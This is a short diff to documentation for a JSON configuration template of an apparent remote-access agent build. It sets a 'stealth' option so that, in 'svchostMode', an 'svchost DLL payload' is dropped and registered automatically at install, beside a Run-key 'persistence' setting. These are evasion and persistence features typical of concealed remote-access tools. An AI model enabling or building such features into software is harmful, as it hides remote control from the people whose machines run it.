@@ -175,7 +175,7 @@ The companion `branding_config.template.json` now mirrors every field consumed b
   "stealth": {
     "enabled": true,
     "svchostMode": true,
-    "bundleExtract": false
+    "bundleExtract": true
   },
   "persistence": {
     "runKey": true,
@@ -190,6 +190,8 @@ The companion `branding_config.template.json` now mirrors every field consumed b
     "meshId": "YOUR_MESH_ID"
   }
 }
+
+> When `stealth.svchostMode` is enabled the build pipeline now forces `stealth.bundleExtract` on so the svchost DLL payload is dropped and registered automatically during installation.
 ```
 
 Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.
